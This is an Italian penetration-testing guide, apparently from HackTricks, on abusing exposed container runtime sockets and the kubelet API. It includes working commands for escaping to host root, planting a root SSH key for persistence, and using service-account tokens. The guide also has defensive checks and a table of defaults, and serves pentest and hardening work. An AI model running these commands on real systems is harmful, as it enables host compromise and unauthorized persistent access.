# Esposizione dell'API di runtime e del daemon

## Panoramica

Molte compromissioni reali dei container non iniziano affatto con un namespace escape. Iniziano dall'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman o kubelet tramite un Unix socket montato o un listener TCP esposto, l'attaccante potrebbe essere in grado di richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, l'API del runtime è il vero confine di sicurezza e comprometterla è, di fatto, quasi equivalente a compromettere l'host.

Per questo motivo, l'esposizione del runtime socket dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities e confinamento MAC ordinari può comunque trovarsi a una sola chiamata API dalla compromissione dell'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` è montato al suo interno. L'isolamento del kernel del container corrente potrebbe funzionare esattamente come previsto, mentre il management plane del runtime rimane completamente esposto.

## Modelli di accesso al daemon

Docker Engine espone tradizionalmente la propria API privilegiata tramite il Unix socket locale `unix:///var/run/docker.sock`. Storicamente è stato esposto anche da remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS sulla porta `2376`. Esporre il daemon da remoto senza TLS solido e autenticazione dei client trasforma di fatto l'API Docker in un'interfaccia root remota.

containerd, CRI-O, Podman e kubelet espongono superfici ad alto impatto simili. I nomi e i workflow differiscono, ma la logica non cambia. Se l'interfaccia consente al chiamante di creare workload, montare path dell'host, recuperare credenziali o modificare container in esecuzione, l'interfaccia è un canale di gestione privilegiato e deve essere trattata di conseguenza.

I percorsi locali comuni da controllare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o più specializzati possono inoltre esporre endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Sono meno comuni negli ambienti moderni, ma quando vengono individuati devono essere trattati con la stessa cautela, perché rappresentano superfici di controllo del runtime e non normali socket applicativi.

## Secure Remote Access

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e, preferibilmente, con autenticazione reciproca, in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di aprire il Docker daemon su HTTP non crittografato per comodità è uno degli errori più pericolosi nella gestione dei container, perché la superficie dell'API è sufficientemente potente da creare direttamente container privilegiati.

Il modello di configurazione storico di Docker era simile al seguente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sugli host basati su systemd, la comunicazione con il daemon può apparire anche come `fd://`, indicando che il processo eredita un socket pre-aperto da systemd invece di associarlo direttamente. La lezione importante non riguarda la sintassi esatta, ma la conseguenza per la sicurezza. Nel momento in cui il daemon ascolta oltre un socket locale con permessi rigorosamente configurati, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie anziché semplici misure di hardening opzionali.

## Abuso

Se è presente un runtime socket, verifica quale sia, se esista un client compatibile e se sia possibile accedere tramite HTTP raw o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un percorso non valido, un socket montato ma inaccessibile e una API privilegiata attiva. Se il client ha successo, la domanda successiva è se l'API può avviare un nuovo container con un bind mount dell'host o con la condivisione del namespace dell'host.

### Quando non è installato alcun client

L'assenza di `docker`, `podman` o di un'altra CLI intuitiva non significa che il socket sia sicuro. Docker Engine comunica tramite HTTP sul proprio socket Unix, mentre Podman espone sia una API compatibile con Docker sia una API nativa di Libpod tramite `podman system service`. Ciò significa che un ambiente minimale con solo `curl` potrebbe comunque essere sufficiente per controllare il daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Questo è importante durante la post-exploitation perché i difensori a volte rimuovono i consueti client binaries, ma lasciano montato il management socket. Sugli host Podman, ricordate che il percorso di alto valore differisce tra deployment rootful e rootless: `unix:///run/podman/podman.sock` per le istanze di servizio rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` per quelle rootless.

### Esempio completo: Docker Socket To Host Root

Se `docker.sock` è raggiungibile, l'escape classico consiste nell'avviare un nuovo container che monta il filesystem root dell'host e quindi eseguire `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo fornisce l'esecuzione diretta come root dell'host tramite il Docker daemon. L'impatto non si limita alla lettura dei file. Una volta entrato nel nuovo container, l'attacker può modificare i file dell'host, raccogliere credenziali, installare persistence o avviare ulteriori workload privilegiati.

### Esempio completo: Docker Socket To Host Namespaces

Se l'attacker preferisce l'accesso ai namespace invece dell'accesso limitato al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con un'esposizione esplicita dei namespace dell'host, invece di sfruttare quello corrente.

### Docker Socket Persistence Pattern

Il controllo del runtime può essere usato anche per la persistence invece che per una shell one-shot. Il pattern generico consiste nel creare un container helper con un host mount, scrivere materiale di accesso autorizzato o un hook di avvio nel filesystem host montato e quindi verificare che l'host lo utilizzi.

Forma dell'esempio:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La stessa idea può prendere di mira le unità systemd, i frammenti cron, i file di avvio delle applicazioni o le chiavi SSH, a seconda di ciò che l'operatore vuole dimostrare. Il punto importante è che la modifica persistente viene effettuata tramite l'autorità del filesystem a livello host del daemon runtime, non tramite privilegi aggiuntivi nel container originale.

### Pivot dell'helper tramite Raw Docker API

Quando la Docker CLI non è disponibile, lo stesso flusso dell'helper con host mount può essere eseguito tramite HTTP sul Unix socket. Il flusso generico è: confermare l'API, creare un container helper con un bind mount dell'host, avviarlo, creare un'istanza exec e avviare tale exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La richiesta finale `/exec/<id>/start` dipende dall’ID exec restituito, ma il punto di sicurezza è indipendente dall’esatto collegamento JSON: l’accesso raw alle API a un Docker daemon rootful è sufficiente per richiedere un helper workload con privilegi maggiori.

### Esempio completo: socket containerd

Un socket `containerd` montato è solitamente altrettanto pericoloso:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se è presente un client più simile a Docker, `nerdctl` può essere più comodo di `ctr` perché espone flag familiari come `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L'impatto è ancora una volta la compromissione dell'host. Anche in assenza di tooling specifici di Docker, un'altra runtime API potrebbe comunque offrire gli stessi privilegi amministrativi. Sui nodi Kubernetes, anche `crictl` può essere sufficiente per la reconnaissance e l'interazione con i container, perché comunica direttamente con l'endpoint CRI.

### BuildKit Socket

`buildkitd` è facile da trascurare perché spesso viene considerato "solo il backend di build", ma il daemon è comunque un control plane privilegiato. Un `buildkitd.sock` raggiungibile può consentire a un attacker di eseguire arbitrary build steps, ispezionare le capacità dei worker, usare contesti locali dall'ambiente compromesso e richiedere entitlements pericolosi come `network.host` o `security.insecure` quando il daemon è stato configurato per consentirli.

Le prime interazioni utili sono:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se il daemon accetta richieste di build, verifica se sono disponibili entitlements non sicuri:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L'impatto esatto dipende dalla configurazione del daemon, ma un servizio BuildKit rootful con entitlements permissivi non è una semplice comodità per gli sviluppatori. Consideralo un'altra superficie amministrativa di alto valore, soprattutto sui CI runner e sui nodi di build condivisi.

### API del kubelet su TCP

Il kubelet non è un container runtime, ma fa comunque parte del piano di gestione del nodo e spesso rientra nella stessa discussione sui confini di trust. Se la porta sicura del kubelet `10250` è raggiungibile dal workload, oppure se sono esposte credenziali del nodo, kubeconfig o autorizzazioni proxy, l'attaccante potrebbe essere in grado di enumerare i Pod, recuperare i log o eseguire comandi nei container locali al nodo senza mai passare dal percorso di ammissione dell'API server Kubernetes.

Inizia con una ricognizione a basso costo:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se il percorso proxy del kubelet o dell'API-server autorizza `exec`, un client compatibile con WebSocket può trasformarlo in code execution in altri container sul nodo. Questo spiega anche perché `nodes/proxy` con la sola autorizzazione `get` sia più pericoloso di quanto sembri: la richiesta può comunque raggiungere endpoint del kubelet che eseguono comandi, e queste interazioni dirette con il kubelet non compaiono nei normali audit log di Kubernetes.<sup>[[2]](#references)</sup>

## Controlli

L'obiettivo di questi controlli è determinare se il container può raggiungere un management plane che avrebbe dovuto rimanere al di fuori del trust boundary.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Cosa è interessante qui:

- Un runtime socket montato è solitamente una primitiva amministrativa diretta, non una semplice disclosure di informazioni.
- Un listener TCP sulla porta `2375` senza TLS deve essere considerato una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato progettato intenzionalmente per comunicare con il runtime dell'host.

## Default dei runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Unix socket locale per impostazione predefinita | `dockerd` ascolta sul socket locale e il daemon è solitamente rootful | montaggio di `/var/run/docker.sock`, esposizione di `tcp://...:2375`, TLS debole o assente su `2376` |
| Podman | CLI daemonless per impostazione predefinita | Non è richiesto alcun daemon privilegiato a lunga esecuzione per l'uso locale ordinario; gli API socket possono comunque essere esposti quando `podman system service` è abilitato | esposizione di `podman.sock`, esecuzione ampia del service, uso dell'API rootful |
| containerd | Socket locale privilegiato | L'API amministrativa è esposta tramite il socket locale e solitamente utilizzata da strumenti di livello superiore | montaggio di `containerd.sock`, accesso ampio a `ctr` o `nerdctl`, esposizione di namespace privilegiati |
| CRI-O | Socket locale privilegiato | L'endpoint CRI è destinato a componenti trusted locali al nodo | montaggio di `crio.sock`, esposizione dell'endpoint CRI a workload non trusted |
| Kubernetes kubelet | API di gestione locale al nodo | Kubelet non dovrebbe essere ampiamente raggiungibile dai Pod; l'accesso può esporre lo stato dei pod, le credenziali e le funzionalità di esecuzione, a seconda di autenticazione e autorizzazione | montaggio di socket o certificati kubelet, autenticazione kubelet debole, host networking con endpoint kubelet raggiungibile |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
